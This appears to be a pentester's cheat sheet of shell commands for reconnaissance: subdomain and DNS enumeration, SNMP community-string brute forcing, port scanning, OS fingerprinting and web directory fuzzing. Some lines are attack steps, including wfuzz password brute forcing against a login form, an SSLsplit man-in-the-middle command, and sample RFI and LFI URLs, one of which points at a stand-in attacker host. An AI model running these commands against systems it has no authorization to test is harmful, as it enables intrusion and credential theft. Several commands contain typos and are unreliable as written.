## ------------------------------------------ ##
cat $IPList.txt | xargs -n1 nmap -sV



##-===============================================================-##
##   [+] Download all recently uploaded pastes on pastebin.com
##-===============================================================-##
elinks -dump https://pastebin.com/archive|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget




tcpdump -i ethO -c 50 -tttt 'udp and port 53'


echo "##-==================================-##"
echo " 	  [+] Capture DNS Exfil Packets		"
echo "##-==================================-##"
tcdpump -w /tmp/dns -sO port 53 and host $Domain


echo "##-=================================================-##"
echo " 	  [+] Cut the exfil!ed hex from the DNS packet		"
echo "##-=================================================-##"
tcpdump -r dnsdemo -n | grep $Domain | cut -f9 -d | cut -fl -d'.' | uniq received. txt



## ----------------------------------------------------- ##
##  [+] Use a bash loop to find the IP address behind each host
## ----------------------------------------------------- ##
for url in $(cat list.txt); do host $url; done


## ----------------------------------------------------- ##
##  [+] Collect all the IP Addresses from a log file and sort by frequency
## ----------------------------------------------------- ##
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn




##-====================================================-##
##  [+] Extract public pdf, doc, and ppt files from target.com 
## -------------------------------------------------------------------- ##
##  [?] (limited to 200 searches and 5 downloads)
## -------------------------------------------------------------------- ##
##  [+] save the downloads to "/root/Desktop/metagoofil/"
##  [+] output results to "/root/Desktop/metagoofil/result.html"
##-====================================================-##
metagoofil -d $Domain -t pdf,doc,ppt -l 200 -n 5 -o /$Dir/ -f /$Dir/$File.html


##-====================================================-##
##    [+] Scan for documents from a domain
##          (-d kali.org) that are PDF files (-t pdf)
##    [+] searching 100 results (-l 100)
##    [+] download 25 files (-n 25)
##    [+] saving the downloads to a directory (-o kalipdf)
##    [+] saving the output to a file (-f kalipdf.html)
##-======================================================-##
metagoofil -d $Domain.org -t pdf -l 100 -n 25 -o /$Dir/ -f $File.html


metagoofil -d $Domain -t pdf -l 200 -o /$Dir/ -f $File.html

metagoofil.py -d $Domain -t doc,pdf -l 200 -n 50 -o /$Dir/ -f $File.html
metagoofil.py -h yes -o /$Dir/ -f $File.html








##-====================================-##
##   [+] find subdomains available:
##-====================================-##
goorecon -s $Domain


##-==========================================-##
##   [+] Find email addresses for Domain:
##-==========================================-##
goorecon -e $Domain



goofile -d $Domain -f pdf



automater -s robtex $IP



Search a Phone Number with Phoneinfoga
phoneinfoga.py -n 1717-9539 --recon




## ------------------------------------------------- ##
##   [+] Harvesting subdomains with assetfinder...
## ------------------------------------------------- ##
assetfinder $URL | grep '.$URL' | sort -u | tee -a $File.txt



assetfinder -subs-only $Domain >> $Dir/assetfinder.txt
echo "  - Found: $(cat assetfinder.txt | wc -l)"



findomain -u $Dir/findomain.txt -t $Domain


sublist3r -v -d $Domain -o $Dir/sublist3r.txt
sed -i 's/<BR>/\n/g' $Dir/sublist3r.txt
sort $Dir/sublist3r.txt | uniq > $Dir/sublist3r-fl.txt

subfinder -d $Domain -o $Dir/subfinder.txt -config $Dir/subfinder-config.yaml

amass enum  --passive -d $Domain -config $Dir/amass-config.ini -o $Dir/$File.txt

findomain -q -f /$Dir/$File -r -u findomain_domains.txt


amass enum -df /$Dir/$File -passive -o amass_passive_domains.txt
subfinder -dL /$Dir/$File -o subfinder_domains.txt


cat domains.txt | httprobe -c 50 -t 3000 >$File.txt

cat alive.txt | aquatone -silent --ports xlarge -out $Dir/ -scan-timeout 500 -screenshot-timeout 50000 -http-timeout 6000

dirsearch.py -E -t 50 --plain-text $Dir/$File -u $host -w /$Dir/$File.txt | grep Target


amass -active -brute -o $File.txt -d $Domain


cat $File.txt | aquatone

cat $File.xml | aquatone -nmap



## ---------------------------------------------------------- ##
##   [+] Harvesting full 3rd lvl domains with sublist3r...
## ---------------------------------------------------------- ##
for domain in $(cat $url/recon/3rd-lvl-domains.txt);do sublist3r -d $domain -o $url/recon/3rd-lvls/$domain.txt;done

## ------------------------------------- ##
##  [+] Probing for alive domains...
## ------------------------------------- ##
cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $url/recon/httprobe/alive.txt



sublist3r -d $Domain

sublist3r -d $Domain --verbose --bruteforce

sublist3r -d $Target -vvv -o $Dir/domains-sublist3r-$Target.txt



subfinder -d $Domain

subfinder -d $Domain -t 100 -v


subfinder -o $Dir/domains-subfinder-$Target.txt -b -d $Target -w $Domains DEFAULT -t 100


## -------------------------------------- ##
##   [?] Running httpx with subfinder
## -------------------------------------- ##
subfinder -d $Domain | httpx -status-code

subfinder -d $Domain | httpx -title -tech-detect -status-code -title -follow-redirects




subjack -w $url/recon/httprobe/alive.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3




#!/bin/bash
$DOMAIN=$1
for host in $(dig +short $DOMAIN ns);
 do
  dig +short $host >> resolvers.txt;
 done


subbrute.py /usr/share/wordlists/SecLists/Discovery/DNS/dns-Jhaddix.txt $DOMAIN | massdns -r ./resolvers.txt -w $DOMAIN.massdns.jhaddix.txt -t A -o S


brutedns.py -d $2 -s fast -l 5



altdns -l ~/urls.txt -o $File.txt

altdns -i ../dir$domain/domains.txt -o ../dir$domain/altdns_data_output.txt  -r -s ../dir$domain/altdns_domains.txt





# https://github.com/drduh/config/blob/master/scripts/dig.sh
query=""
for type in {A,AAAA,ALIAS,CNAME,MX,NS,PTR,SOA,SRV,TXT,DNSKEY,DS,NSEC,NSEC3,NSEC3PARAM,RRSIG,AFSDB,ATMA,CAA,CERT,DHCID,DNAME,HINFO,ISDN,LOC,MB,MG,MINFO,MR,NAPTR,NSAP,RP,RT,TLSA,X25} ; do
  dig +noall +short +noshort +answer $query $type ${1} 2>/dev/null
done





photon -u $Domain -l 3 -t 100


EyeWitness --web --single $Domain
EyeWitness --web -f $File -d $Dir/




## --------------------------------------------- ##
##  [?] Enumerates a domain for DNS entries
## --------------------------------------------- ##
dnsdict6 -4 -d -t 16 -e -x $Domain


sslscan $ip:443
sslscan --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour $Domain



echo "Please provide the target ip address and the port."

sslscan --show-certificate --verbose --no-colour --xml=sslscan_$1_$2.xml $1:$2 2>&1 | tee "$1_$2_sslscan.txt"


sslh




sslyze $Domain --resume --certinfo=basic --compression --reneg --sslv2 --sslv3

sslyze -regular $Domain


tlssled $Domain 443

sslyze $domain --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers

sslyze $domain --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers > tmp



# SSLsplit is a tool for man-in-the-middle attacks against SSL/TLS encrypted network connections.
sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080





httsquash -r $Domain

httprint -h $Domain -s $File.txt -P0


## ------------------------------------------------- ##
##   [+] Harvesting subdomains with assetfinder...
## ------------------------------------------------- ##
assetfinder $URL | grep '.$URL' | sort -u | tee -a $File.txt


assetfinder -subs-only $target > $File
assetfinder -subs-only $target > $subs_dir/assetfinder.txt


findomain -u $File -t $target
findomain -u $subs_dir/findomain.txt -t $target


sublist3r -v -d $target -o $File.txt
sed -i 's/<BR>/\n/g' $File.txt
sort $File | uniq > $File-sorted.txt


subfinder -d $target -o $subs_dir/subfinder.txt -config $config_dir/subfinder-config.yaml

amass enum  --passive -d $target -config $config_dir/amass-config.ini -o $subs_dir/amass.txt



hellfire

emailharvester

instaloader
inspy 
sherlock
irpas
sslh
swaks
hosthunter
finalrecon
dnschef
commix
cloudbrute
themole
websploit
weevely




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SNMP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##  [+] Enmerate users from SNMP
snmpwalk public -v1 192.168.X.XXX 1 | grep 77.1.2.25 | cut -d” “ -f4
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP $TARGET

##  [+] Search SNMP with nmap
nmap -sT -p 161 192.168.1.0/24 -oG $File.txt


##  [+] Version3
nmap -sV -p 161 --script=snmp-info 192.168.1.0/24
nmap -sU  172.16.201.130 -p161 --script=snmp-brute  -Pn --script-args snmp-brute.communitiesdb=list.txt


##  [+] Wordlists
Metasploit Module snmp_enum
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt


##  [+] SNMP ENumeration:

snmpget -v 1 -c public IP version
snmpcheck -t $TARGET
snmpenum -t $TARGET
snmpwalk -v 1 -c public IP
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2
snmpbulkwalk -v 2 -c public IP

snmpbrute.py -t <ip>

## gather snmp v1 information with standard community strings
snmpwalk -v1 -c public target-ip
snmpwalk -v1 -c private target-ip
snmpwalk -v1 -c manager target-ip

## enumerate windows users
snmpwalk -c public -v1 target-ip 1.3.6.1.4.1.77.1.2.25
    
## enumerate current windows processes
snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.25.4.2.1.2
    
## enumerate windows open tcp ports
snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.6.13.1.3
 
## enumerate installed software
snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.25.6.3.1.2


use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/snmp/snmp_enumshares
use auxiliary/scanner/snmp/snmp_enumusers
use auxiliary/scanner/snmp/snmp_login

onesixtyone -c community -I $TARGET


onesixtyone -i $line -o ../dir${domain}/snmponesixtyone_output.txt
onesixtyone -c /usr/share/sparta/wordlists/snmp-default.txt -o snmp_one_sixtyone${2}.txt


onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -dd $1 2>&1 | tee "snmp_onesixtyone_$1.txt"


patator snmp_login host=$line version=3 user=FILE0 0=$USERNAME -x ignore:mesg=unknownUserName


patator snmp_login host=$line version=3 user=FILE0 auth_key=FILE1 0=$USERNAME 1=$auth_key -x ignore:mesg=wrongDigest



## --------------------------------------- ##
##  [?] Miranda - discover UPNP devices
## --------------------------------------- ##
miranda -i eth0 -v




## --------------------------------------------------------------------- ##
##   [+] Double checking for subdomains with amass and certspotter...
## --------------------------------------------------------------------- ##
amass enum -d $URL | tee -a $URL/recon/$File.txt
curl -s https://certspotter.com/api/v0/certs\?domain\=$URL | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u
certspotter | tee -a $URL/recon/$File.txt




certspotter | tee -a $url/recon/final1.txt
sort -u $url/recon/final1.txt >> $url/recon/final.txt

subjack -w $url/recon/httprobe/alive.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> $url/recon/potential_takeovers/potential_takeovers1.txt






nmap -sU -sV -p 53 --script dns-recursion $domain






dnscan.py --domain $Domain --wordlist $File


dnscan -d $Target -w $Domains QUICK -o $Dir/domains-dnscan-$Target.txt






fierce --domain $Domain --subdomains accounts --traverse 10
fierce --domain facebook.com --subdomains accounts admin ads
fierce --domain facebook.com --subdomains admin --traverse 10


##-============================================================================-##
##   [+] Limit nearby IP traversal to certain domains with the --search flag:
##-============================================================================-##
fierce --domain $Domain --subdomains admin --search $Domain $Domain
fierce --domain facebook.com --subdomains admin --search fb.com fb.net

##-==================================================================================-##
##   [+] Attempt an HTTP connection on domains discovered with the --connect flag:
##-==================================================================================-##
fierce --domain $Domain --subdomains mail --connect



##-=========================-##
##  [+] Fierce
##-=========================-##
fierce -dns $Domain
fierce -dns $Domain -file $OutputFile
fierce -dns $Domain -dnsserver $Server
fierce -range $IPRange -dnsserver $Server
fierce -dns $Domain -wordlist $Wordlist
fierce -dnsserver $DNS -dns $Domain -wordlist /usr/share/fierce/hosts.txt


fierce -dns $Domain -threads 3



# To scan a domain and output to a file
fierce -dns $Domain -file $File

# To scan a domain and specify which dnsserver to use
fierce -dns $Domain -dnsserver <server>

# To scan an internal ip range for a given server
fierce -range <ip-range> -dnsserver <server>

# To scan a domain using a given wordlist
fierce -dns $Domain -wordlist <wordlist>

# To scan a domain using a specified timeout and number of ip addresses to branch from all found addresses
fierce -dns $Domain -tcptimeout <# seconds> -traverse <# addresses>

# To scan domains from a list and search the entire class C for each found
fierce -dnsfile $File -wide















dnsenum.pl --enum -f $File.txt --update a -r $Domain >> ~/Enumeration/$domain



##-=====================================================================-##
##   [+] Search for the A record of $Domain on your local nameserver:
##-=====================================================================-##
dnstracer $Domain


##-=====================================================================-##
##   [+] Search for the MX record of $Domain on the root-nameservers:
##-=====================================================================-##
dnstracer "-s" . "-q" mx $Domain


##-=================================================================-##
##   [+] Search for the PTR record (hostname) of 212.204.230.141:
##-=================================================================-##
dnstracer "-q" ptr 141.230.204.212.in-addr.arpa


##-========================-##
##   [+] IPv6 addresses:
##-========================-##
dnstracer "-q" ptr "-s" . "-o" 2.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.6.4.0.2.0.0.0.0.8.b.0.e.f.f.3.ip6.int



##-=================================================================-##
##   [+]
##-=================================================================-##
dnstop -l 3 eth0



##-================-##
##  [+] DNSMap
##-================-##
dnsmap -w $File.txt $Domain


## ----------------------------------------------------------- ##
##   [+] DNSenum - enumerate various DNS records, such as:
##                 NS, MX, SOA, and PTR records.
##   [?] DNSenum also tries to perform DNS zone transfer
## ----------------------------------------------------------- ##

dnsenum -p 5 -s 20 $Domain
dnsenum -f $File.txt $Domain
dnsenum -o dnsenum_info $Domain

dnsenum --enum -f $File.txt --update a -r $URL




fragroute -f $Location $IP

fragrouter -i eth0 $options


nping -c 1 --tcp -p 80,433 $Domain

nping -tcp -p 445 -data hexdata(AF56A43D) $IP

nping --tcp -p 22 --flags syn --ttl 2 192.168.1.1

##-===============================-##
##   [+] NMap script categories  
##-===============================-##
nmap --scripts vuln,safe,discovery -oN scan.txt $IP

##-==============================-##
##   [+] list all nse scripts  
##-==============================-##
ls -lh /usr/share/nmap/scripts/


##-==================================-##
##   [+] nmap through socks4 proxy  
##-==================================-##
nmap --proxies socks4://proxy-ip:1080 $IP


##-=========================-##
##   [+] FTP Bounce Scan
##-=========================-##
nmap -P0 -n -b $User:$Pass@$IP $IP2 --proxies socks4://proxy-ip:1080 -vvvv



## -------------------------------------------------------------------------------------------- ##
##   [?] Checks target IP addresses against multiple DNS anti-spam and open proxy blacklists
## -------------------------------------------------------------------------------------------- ##
nmap --script dns-blacklist --script-args='dns-blacklist.ip=$IP'


##-===========================-##
##   [+] dns-zone-transfer:
##-===========================-##
## ---------------------------------------------------------------- ##
##   [?] Attempts to pull a zone file (AXFR) from a DNS server.
## ---------------------------------------------------------------- ##
nmap --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=$Domain -p53 $IP





nmap --script dns-brute --script-args dns-brute.domain=foo.com,dns-brute.threads=6,dns-brute.hostlist=./hostfile.txt,newtargets -sS -p 80
nmap --script dns-brute $Domain



nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains=$Domain' $IP




nmap -sn -Pn ns1.example.com --script dns-check-zone --script-args='dns-check-zone.domain=$Domain'



nmap -n -Pn -p53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me $Domain



nmap -n -sV -Pn -vv -sT -p $Port --script dns-cache-snoop,dns-check-zone,dns-ip6-arpa-scan,dns-nsec-enum,dns-nsec3-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-srv-enum,dns-update,dns-zone-transfer,whois-domain --script-args dns-check-zone.domain=%s,dns-nsec-enum.domains=%s,dns-nsec3-enum-domains=%s,dns-srv-enum.domain=%s,dns-zone-transfer.domain=

nmap -n -sV -Pn -vv -sU -p $Port --script dns-cache-snoop,dns-check-zone,dns-ip6-arpa-scan,dns-nsec-enum,dns-nsec3-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-srv-enum,dns-update,dns-zone-transfer,whois-domain --script-args dns-check-zone.domain=%s,dns-nsec-enum.domains=%s,dns-nsec3-enum-domains=%s,dns-srv-enum.domain=%s,dns-zone-transfer.domain=




curl https://api.hackertarget.com/aslookup/?q=$1 > IP_LIST.txt


Finding netblocks that belong to an ASN using targets-asn NSE script
nmap --script targets-asn --script-args targets-asn.asn=$ASN

Find Information about IP address
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24

find ASN for a given IP address
curl -s http://ip-api.com/json/$IP | jq -r .as

echo "[+] Lookup autonomous systems of all outgoing http/s traffic"
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3



## ------------------------------------------- ##
##   [?] Find Information about IP addresses
## ------------------------------------------- ##
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24



##-=========================================-##
##   [+] NMap - live hosts - Netmask Scan
##-=========================================-##
nmap -vv -n -sn -PM -oA $File $1 | grep -w 'report' | grep -v 'host down' | sed 's/Nmap scan report for //' | sort -u -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 | tee $LOGNAME2




## ---------------------------------------------------------------------- ##
	fping -a -q -g $2				## Generate Alive Hosts From File
## ---------------------------------------------------------------------- ##
	fping -g $IP $IP				## Generate Host List:
## ---------------------------------------------------------------------- ##
	fping -s $Domain				## Display Statistics:
## ---------------------------------------------------------------------- ##
	fping < $File					## ping addresses read from a file
## ---------------------------------------------------------------------- ##
	fping -ag 192.0.2.0/24			## Find hosts in a given subnet
## ---------------------------------------------------------------------- ##
	fping $IP -s -c 10000 -p 100	## send high rate of
									## echo-request packets
## ---------------------------------------------------------------------- ##


## --------------------------------------------------------- ##
##   [?] Use fping to test reachability to range of hosts
##       using bash for loop to define hosts
## --------------------------------------------------------- ##
for i in {1..5} ; do fping -C 3 -d -q -s -g 10.0.2$i.100 10.0.2$i.150 ; done



fping -A -f /tmp/ip 2>&-


##-====================================================-##
##   [+] Print List of Live Hosts on Local Network:
##-====================================================-##
genlist -s 192.168.1.\*




p0f - passive os fingerprinting utility

p0f -i wlan0


## ----------------------------------------- ##
##   [+] Set iface In promiscuous mode
##   [+] dump traffic to the log file
## ----------------------------------------- ##
p0f -i eth0 -p -d -o $File.log




p0f -r $File



wafw00f $Domain




## ------------------------------------------------- ##
##   [+] Xprobe2 OS fingerprinting
## ------------------------------------------------- ##
##   [?] fuzzy signature matching to provide
##       the probable operating system assessment
## ------------------------------------------------- ##
xprobe2 $IP

xprobe2 -v -p tcp:80:open $IP
xprobe2 -v -p tcp:80:open 192.168.6.66


xprobe2 -v -p tcp:80:open 192.168.6.66







## ---------------------------------------------------------------------- ##
##   [?] DMitry  (Deepmagic Information Gathering Tool)
## ---------------------------------------------------------------------- ##
dmitry -n $Domain       ## Retrieve  netcraft.com  data
dmitry -i $IP           ## Internet Number whois lookup
dmitry -w $Domain       ## Perform a whois lookup on the host target.
dmitry -p $Domain       ## Perform a TCP portscan on the host target
dmitry -s $Domain       ## Perform a subdomain search
dmitry -o $File $Domain ## Create  an ascii text output of the results



## ---------------------------------------------------------------------------- ##
##   [+] Lbd (load balancing detector)
##   [?] detects whether a given domain uses DNS and/or HTTP load-balancing
## ---------------------------------------------------------------------------- ##
lbd.sh $URL


## ---------------------------------------------------------------------- ##
##   [?] Halberd - HTTP-based load balancer detector.
##   [?]           checks for differences in the
##   [?]           HTTP response headers, cookies, timestamps, etc.
## ---------------------------------------------------------------------- ##
halberd $Domain




SYN                     :    -mT
ACK scan                :    -mTsA
Fin scan                :    -mTsF
Null scan               :    -mTs
Xmas scan               :    -mTsFPU
Connect Scan            :    -msf -Iv
scan with all options   :    -mTFSRPAUEC
Syn + osdetect          :    -eosdetect -Iv (-mT)
scan ports 1 through 5  :   (-mT) host:1-5



unicornscan -mU -I 192.168.24.53:a -v -l unicorn\_full\_udp.txt
unicornscan -mT -I 192.168.24.53:a -v -l unicorn\_full\_tcp.txt





unicornscan 192.168.0.0/24:139				## network wide scan on port 139:

unicornscan -r500 -mT 198.71.232.1/24:80,443,445,339

unicornscan -r200 -Iv -eosdetect  -mT 198.71.232.3:3306,80,443

unicornscan -r200 -Iv -eosdetect -mT vyxunbnbs.com:3306,80,443

unicornscan -eosdetect -Iv -v vyxunbnbs.com

unicornscan -msf -v -I 198.71.232.3/24 


http://127.0.0.1/unicornscan


pnscan


openvas-scanner


onesixtyone


masscan







 •
 •
 •
 •
 •
 •
BurpSuite
Arachni
Metasploit WMAP
Nikto
OWASP Zap
w3af


##-====================================-##
##   [•] Remote File Inclusion (RFI)
##-====================================-##
## ------------------------------------------------------------------------- ##
##   [?] Attacker references a file on another server
## ------------------------------------------------------------------------- ##
##   [?] http://original.com/page.php?font=http://badbuy.com/bad_file.php
## ------------------------------------------------------------------------- ##


##-===================================-##
##   [•] Local File Inclusion (LFI)
##-===================================-##
## ---------------------------------------------------------------------- ##
##   [?] Attacker can exploit this to access files local to the server.
## ---------------------------------------------------------------------- ##
##   [?] http://oringal.com/page.php?font=../../Windows/system32/cmd.exe%00
## ---------------------------------------------------------------------- ##






nikto -h $IP -p 1234 $IP
nikto -C all -h 192.168.1.1 -p 80
nikto -C all -h 192.168.1.1 -p 443


nikto -h $IP -p $PORT



## ---------------------------------------------------- ##
##   [+] Proxy Enumeration (useful for open proxies)
## ---------------------------------------------------- ##
nikto -useproxy http://$IP:3128 -h $IP



nikto -Option USERAGENT=Mozilla -url=http://10.11.1.24  -o nikto.txt

nikto -port 80,443 -host $ip -o -v nikto.txt

nikto -host $IP -C all -p 80 -output $File.txt | grep -v Cookie


nikto -h $Domain -port 443 -Format htm --output $Domain.htm



## performing nikto webscan on port $port... 
nikto -host $target:$port -Format txt -output $logfile



nikto -host $1 -port $2 -nossl -output $File.html -useragent "$3"



## ------------------------------------------------------------------- ##
##   [?] Please provide the target protocol scheme (http or https)
##   [?] target IP address or hostname, the target port
##   [?] the user agent string and the proxy server.
## ------------------------------------------------------------------- ##
nikto -ask=no -h $1://$2:$3 -output $1_$2_$3_nikto.html -useragent $4 -useproxy $5 2>&1 | tee $1_$2_$3_nikto.txt



nikto -ask=no -h $1://$2:$3 -output $1_$2_$3_nikto.html -useproxy $4 2>&1 | tee $1_$2_$3_nikto.txt



nikto -ask=no -h $1://$2:$3 -output $1_$2_$3_nikto.html 2>&1 | tee "$1_$2_$3_nikto.txt"





httrack $Domain/$File.html --spider -P proxy.myhost.com:8080

httrack $Domain/$File.html --spider -P 10.8.0.1:1080
httrack $Domain/$File.html --spider -P 10.64.0.1:1080
--verbose
--urllist					##
--mirror $URLs
-*p3   ## save all files
--debug-headers					##
--user-agent					##

--single-log			## -f2    one single log file
--file-log				## -f     *log in files
--debug-log				##
--extra-log				## -z     log - extra infos

--debug-xfrstats				## -#T    generate transfer ops. log every minutes
--debug-ratestats				## -#Z    generate transfer rate statictics every minutes

--debug-parsing					## -#d    debug parser

--debug-cache					## -#C    cache list




## --------------------------------------------- ##
##   [?] print request and response headers
##   [?] request headers + response headers
## --------------------------------------------- ##
http -p Hh $Domain


## --------------------------------------------- ##
##   [?] print request and response headers
##   [?] request headers + response headers
##   [?] follow redirects
##   [?] skip SSL verification
## --------------------------------------------- ##
http -p Hh $Domain --follow --verify no


## --------------------------------------------- ##
##   [?] Use Proxy for connection
## --------------------------------------------- ##
http -p Hh $Domain --follow --verify no --proxy http:http://127.0.0.1:16379


## --------------------------------------------------------------------------- ##
##   [?] DotDotPwn - fuzzer to discover traversal directory vulnerabilities
## --------------------------------------------------------------------------- ##
dotdotpwn.pl -m http -h $IP -M GET -o unix
dotdotpwn.pl -m http -h 192.168.1.1 -M GET


## ------------------------ ##
##  [+] Url brute force
## ------------------------ ##
dirb http://$IP -r -o dirb-$IP.txt

dirb http://"$1"/ | tee /tmp/results/$1/$1-dirb-$port.txt

dirb http://10.0.0.165/ /usr/share/wordlist/dirb/big.txt

list-urls.py $Domain

dirb http://$host:$port/ /usr/share/dirb/wordlists/big.txt -a \"$2\" -o dirb-results-http-$host-$port.txt -f 
dirb https://$host:$port/ /usr/share/dirb/wordlists/big.txt -a \"$2\" -o dirb-results-https-$host-$port.txt -f



## --------------------------------------- ##
##   [?] Please provide the following:
##       > Target URL Base
##       > User Agent String
##       > Proxy Host and Port
## --------------------------------------- ##
dirb $1 /usr/share/seclists/Discovery/Web-Content/big.txt -a $2 -l -r -S -o $LOGNAME -p $3:$4


dirb $1 /usr/share/seclists/Discovery/Web-Content/big.txt -l -r -S -o $LOGNAME




dirsearch -b -u $1 -t 16 -r -E -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --plain-text-report=$LOGNAME


dirsearch -b -u $1 -t 16 -r -E -f -w /usr/share/seclists/Discovery/Web-Content/big.txt --plain-text-report=$LOGNAME



gobuster dir -u $1 -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -z -k -l -o $LOGNAME




## --------------------------------------- ##
##   [?] Please provide the following:
##       > Target URL
##       > User Agent String
##       > HTTP code to ignore
## --------------------------------------- ##
dirb $1 /usr/share/seclists/Discovery/Web-Content/big.txt -a $2 -l -r -S -o $LOGNAME -f -N $3




##-============================-##
##   [+] Web Servers Recon:
##-============================-##

gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.48:80 -o recon/gobuster_10.10.10.48_80.txt
nikto -host 10.10.10.48:80 | tee recon/nikto_10.10.10.48_80.txt


gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt



## ------------------------- ##
##  [+] Directory Fuzzing
## ------------------------- ##
dirb $Domain /usr/share/wordlists/dirb/big.txt -o $File.txt
gobuster -u $Domain -w /usr/share/wordlists/dirb/big.txt -t 100

## ----------------------------------------------- ##
##  [?] A for loop so you can go do other stuff
## ----------------------------------------------- ##
for wordlist in $(ls);do gobuster -u $Domain -w $File -t 100;done


gobuster -w /usr/share/wordlists/dirb/common.txt -u http://$IP/

gobuster -u http://$IP/  -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403,500' -e

gobuster dir -u http://$IP/ -w $File.txt
gobuster dir -u https://10.11.1.35 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -k -o gobuster

recursebuster -u $Domain -w wordlist.txt


gobuster -u http://$IP/ -w /usr/share/wordlist/dirb/big.txt -s '200,204,301,302,307,403,500' -e

##-==========================================================-##
##   [+] bruteforce webdirectories and files by extention
##-==========================================================-##
gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 30


## ----------------------------------------------------- ##
##   [?] https://github.com/jaeles-project/gospider
## ----------------------------------------------------- ##
gospider -S websites.txt --js -t 20 -d 2 --sitemap --robots -w -r > urls.txt



dirsearch -u http://$IP/ -e .php




echo "Please provide the protocol scheme (http or https), the target server (IP address, hostname or URI) and the port."

whatweb --color=never --no-errors -a 3 -v $1://$2:$3 2>&1 | tee "$1_$2_$3_whatweb.txt"

##-=================================================================-##
##   [+] performing whatweb fingerprinting on $target port $port
##-=================================================================-##
whatweb -a3 --color never http://$target:$port --log-brief $logfile



whatweb -v $domain > data/$file_/analysis/dynamic/domain_info.txt


## --------------------------------------- ##
##   [?] identifies all known services
## --------------------------------------- ##
whatweb $IP

whatweb $ip:80 --color=never --log-brief="whattheweb.txt"


##-======================================-##
##  [+] whatweb - Pulling plugins data
##-======================================-##
whatweb --info-plugins -t 50 -v $Domain >> $File.txt


##-=============================================-##
##  [+] whatweb - Running whatweb on $Domain
##-=============================================-##
whatweb -t 50 -v $Domain >> $File.txt



dirsearch -u $Domain -e php






##-========================================-##
##    [+] dirsearch - HTTP Enumeration
##-========================================-##
dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old



for host in `cat alive.txt`; do
    DIRSEARCH_FILE=$(echo $host | sed -E 's/[\.|\/|:]+/_/g').txt
    dirsearch -e $DIRSEARCH_EXTENSIONS -r -b -u -t $DIRSEARCH_THREADS --plain-text reports/dirsearch/$DIRSEARCH_FILE -u $host
done



##-========================================-##
##    [+] 
##-========================================-##
httprobe
httprobe -s -p https:443


cat all.txt | httprobe -c $Concurrency -t $Timeout >> alive.txt
echo "  - $(cat alive.txt | wc -l) assets are responding"


##-========================================-##
##    [+] Wfuzz - The web brute forcer
##-========================================-##
wfuzz -c -z $File.txt --sc 200 http://$IP


##-===================================-##
##    [+] bruteforce web parameter
##-===================================-##
wfuzz -u http://target-ip/path/index.php?param=FUZZ -w /usr/share/wordlists/rockyou.txt


##-======================================-##
##    [+] bruteforce post data (login)
##-======================================-##
wfuzz -u http://target-ip/path/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt




wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test

wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ

wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"

wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ

